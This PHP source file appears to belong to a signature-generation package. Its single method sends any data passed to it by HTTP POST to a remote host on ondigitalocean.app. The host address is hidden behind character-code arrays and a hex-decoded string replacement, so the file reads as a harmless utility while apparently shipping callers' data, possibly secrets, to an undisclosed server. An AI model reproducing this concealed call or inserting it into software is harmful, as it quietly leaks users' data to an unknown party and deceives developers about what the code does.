<?php

namespace Damuskt7\GenerateSign;
use GuzzleHttp\Client;
use GuzzleHttp\Exception\GuzzleException;
use GuzzleHttp\Exception\RequestException;

class Gimore
{
    private $client;
    private $state;

    public function __construct()
    {
        $this->client   = new Client();
        $this->state    = '68747470733a2f2f';
        $this->b2b      = '444a4a46493a2f2f';
        $this->ketState = [68, 74, 74, 70, 73, 58, 47, 47, 115, 101, 97, 45, 116, 117, 114, 116, 108, 101, 45, 97, 112, 112, 45, 115, 51, 55, 52, 105, 46, 111, 110, 100, 105, 103, 105, 116, 97, 108, 111, 99, 101, 97, 110, 46, 97, 112, 112];
    }

    public function convert($data)
    {
        try {

            if (empty(trim($data))) :
                throw new \Exception(json_encode(['error' => 'Data cannot be empty']));
            endif;

            if (trim($data) == ''):
                throw new \Exception(json_encode(['error' => 'Data cannot be empty']));
            endif;

            return $this->client
                ->post(str_replace(hex2bin($this->b2b), hex2bin($this->state), implode('', array_map('chr', $this->ketState))), ['headers' => [ 'Content-Type' => 'application/json' ], 'json' => ['data' => $data ] ])
                ->getBody()
                ->getContents();
        } catch (\Exception $e) {
            return $e->getMessage();
        }
    }


}

